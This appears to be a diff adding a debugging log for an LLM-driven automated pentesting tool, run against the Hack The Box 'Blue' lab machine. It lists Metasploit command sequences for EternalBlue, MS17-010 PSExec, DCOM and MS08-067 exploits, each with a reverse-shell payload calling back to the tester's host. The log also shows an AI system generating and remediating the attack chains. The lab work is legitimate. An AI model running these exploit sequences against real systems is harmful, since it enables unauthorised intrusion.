@@ -531,3 +531,164 @@ All 4 classifications were CORRECTABLE. Arguably 2+ should have been FUNDAMENTAL
 6. **Improvement over Run 1:** Run 1 = 0/3 (0%), Run 2 = partial success in 3 rounds. The feedback loop is the only code change between the two runs.
 
 7. **Cost is not correct:** Attack chain generation total: $1.071 actual across 16 dashboard calls. PLANTE logged this as 3 calls.
+
+---
+
+## HTB Blue (10.129.21.59, Windows) — Feb 10, 2026
+
+Known correct exploit for this box: **EternalBlue MS17-010** (`exploit/windows/smb/ms17_010_eternalblue`) on port 445. Classic Windows SMB vulnerability that gives SYSTEM access directly. One of the most well-known MSF exploits.
+
+Recon found: **Ports 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds)** — Windows 7, WORKGROUP: WORKGROUP, Host: HARIS-PC. Recon correctly identified `ms17_010_eternalblue` and `ms03_026_dcom` as exploit hints.
+
+---
+
+### Run 1 — 18:48 | Result: CRASHED — 0/6 Chains across 3 Rounds, No Data Files Saved
+
+**First Windows box test. First run after generalization audit (8 fixes).**
+
+---
+
+#### ROUND 1 — 0/2 Chains Succeeded
+
+##### Chain 1: EternalBlue SMB Exploit (ms17_010_eternalblue)
+
+**Steps executed:**
+1. `msfconsole -q` → start_session → OK
+2. `use exploit/windows/smb/ms17_010_eternalblue` → OK
+3. `set RHOSTS 10.129.21.59` → OK
+4. `set RPORT 445` → OK
+5. `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → OK
+6. `set LHOST 10.10.16.249` → OK (tun0 VPN IP)
+7. `set LPORT 4444` → OK
+8. `exploit -j` → marked SUCCESS (no error markers found)
+9. `sessions -l` → **"No active sessions."**
+
+**Validation:** `initial_access` FAILED — no "session opened" in output.
+
+**Why it failed:** The exploit ran in background (`-j`) but produced no session. Most likely cause: the `wait` time between `exploit -j` and `sessions -l` was too short. EternalBlue needs time to complete (kernel exploitation, staging). If the LLM set `"wait": 2` (default) instead of `"wait": 15` (as instructed in the prompt), `sessions -l` would run before the exploit finishes.
+
+**Classification:** CORRECTABLE — "target is vulnerable (Windows 7, matching MS17-010), adjust GroomAllocations, set VerifyArch/VerifyTarget to false."
+**Classifier correct?** Reasonable. The fix suggestion (adjust GroomAllocations) is plausible for EternalBlue reliability.
+
+---
+
+##### Chain 2: DCOM RPC Exploit (ms03_026_dcom)
+
+**Steps executed:**
+1-8. Standard MSF setup with `windows/x64/meterpreter/reverse_tcp`
+9. `sessions -l` → **"No active sessions."**
+
+**Why it failed:** MS03-026 targets Windows NT/2000/XP/2003. The target is Windows 7 — wrong OS generation entirely.
+
+**Classification:** FUNDAMENTAL — "Version mismatch (target is Windows 7, exploit for older OS) and access denied confirm incompatibility."
+**Classifier correct?** Yes. Correct diagnosis.
+
+---
+
+#### Remediation (Round 1, Chain 1 only)
+
+The remediation LLM adjusted Chain 1:
+- Changed payload to `windows/x64/shell/reverse_tcp` (staged shell instead of meterpreter)
+- Added `set GroomAllocations 13` (default is 12)
+- Added `set VerifyArch false` and `set VerifyTarget false`
+
+**Remediation execution:** Still "No active sessions." Same problem — exploit ran, no session created.
+
+---
+
+#### ROUND 2 — 0/2 Chains Succeeded
+
+##### Chain 1: MS17-010 PSExec Exploit (ms17_010_psexec)
+
+A different EternalBlue variant. Same setup pattern with `windows/x64/meterpreter/reverse_tcp`.
+
+**Result:** "No active sessions." Same pattern as Round 1.
+
+**Classification:** FUNDAMENTAL — "Investigation evidence shows module_exists = false, indicating no Metasploit module available."
+**Classifier correct?** **WRONG.** The module absolutely exists — it was just used and loaded successfully. The classifier was **misled by a bug in the investigation phase** (see Bug #1 below).
+
+---
+
+##### Chain 2: MS08-067 NetAPI Exploit (ms08_067_netapi)
+
+**Steps executed:**
+1-8. Standard MSF setup with `set TARGET 38`
+9. `exploit -j` → **FAILED** — `Rex::Proto::SMB::Exceptions::ErrorCode The server responded with e...` (access denied)
+10. `sessions -l` → No active sessions.
+
+**Why it failed:** MS08-067 targets Windows XP/2003. Windows 7 is not vulnerable.
+
+**Classification:** FUNDAMENTAL — "Version mismatch (target is Windows 7, exploit for older OS) and access denied confirm incompatibility."
+**Classifier correct?** Yes.
+
+---
+
+#### ROUND 3 — CRASH
+
+The LLM returned only **58 output tokens** — essentially garbage, no valid JSON.
+
+**Error:**
+```
+WARNING: Attack chain response missing fields: ['target', 'summary', 'attack_chains']
+WARNING: No valid attack_chains found in response
+KeyError: 'target'
+  File "orchestrator.py", line 256, in execute_attack_chain_via_ssh
+    "target": attack_chain_json["target"],
+```
+
+`extract_json_from_llm_response()` returned `{"raw_output": "..."}` (no "target" key). `execute_attack_chain_via_ssh()` crashed on `attack_chain_json["target"]` (direct key access without `.get()`). Exception caught at line 1118, **skipping ALL result saving** (lines 1104-1111 are inside `try` block). Only `token_tracker.save()` in `finally` block ran.
+
+**Result:** ALL execution data from Rounds 1 and 2 lost. No attack_chain, execution, classification, or remediation files saved.
+
+---
+
+### Bugs Exposed
+
+#### Bug #1 (CRITICAL): Investigation searches MSF by Nmap service name, not module name
+
+The `investigate_failure()` function runs:
+```
+msfconsole -q -x 'search type:exploit name:microsoft-ds; exit'
+```
+
+It uses `service_name` from the recon data ("microsoft-ds" — what Nmap calls SMB). But MSF modules are named by vulnerability/technique (`ms17_010_eternalblue`, `ms17_010_psexec`), not by Nmap service names. So the search returns **zero results**, and `module_exists` is set to `False`.
+
+**Impact:** The classifier receives `module_exists = false` and concludes "no Metasploit module available" → marks chains as FUNDAMENTAL. In Round 2, the correctly-identified MS17-010 PSExec exploit was classified as FUNDAMENTAL and **skipped remediation entirely** — because the investigation told the classifier the module doesn't exist. This is actively sabotaging the classifier.
+
+**Same bug affected Lame:** The investigation searched for `name:netbios-ssn` and `name:microsoft-ds` instead of `name:usermap_script` or `name:samba`.
+
+#### Bug #2: `execute_attack_chain_via_ssh` crashes on malformed input
+
+Line 256: `attack_chain_json["target"]` uses direct key access. When the LLM returns garbage, this throws `KeyError` instead of gracefully handling it.
+
+#### Bug #3: Result saving not crash-proof
+
+Save code (lines 1104-1111) is inside the `try` block. Any crash during the feedback loop causes ALL accumulated round data to be lost. The `finally` block only saves token usage.
+
+#### Bug #4 (Suspected): Wait time for `exploit -j` too short
+
+The prompt instructs `"wait": 15` for `exploit -j`, but we can't verify the LLM respected this because wait values aren't logged. If default `"wait": 2-3` was used, EternalBlue wouldn't finish before `sessions -l` runs.
+
+---
+
+### Cost
+
+| Provider | Input Tokens | Output Tokens | Logged Cost |
+|----------|-------------|---------------|-------------|
+| OpenRouter (Recon) | 13,712 | 4,978 | $0.116 |
+| AnythingLLM (6 calls) | 36,630 | 17,545 | $0.373 |
+| **Total** | **50,342** | **22,523** | **$0.489** |
+
+---
+
+### Key Takeaways
+
+1. **Investigation bug is the #1 priority fix.** It's been actively sabotaging the classifier by claiming modules don't exist. This affected both Lame and Blue runs. The fix: search by the actual exploit module name or vulnerability name used in the chain, not the Nmap service name.
+
+2. **EternalBlue should work but timing might be the issue.** The correct module was selected, correct payload chosen, correct LHOST used. The most likely failure reason is insufficient wait time between `exploit -j` and `sessions -l`. Need to log the actual wait values to confirm.
+
+3. **The crash-on-garbage-response bug needs a defensive fix.** Use `.get()` instead of direct key access, and move result saving to the `finally` block.
+
+4. **Classifier was 2/4 correct.** DCOM (FUNDAMENTAL ✓), MS08-067 (FUNDAMENTAL ✓), EternalBlue R1 (CORRECTABLE ✓), MS17-010 PSExec R2 (FUNDAMENTAL ✗ — poisoned by investigation bug).
+
+5. **No result data survived.** We spent $0.49 and an hour but have zero saved diagnostic files due to the Round 3 crash.
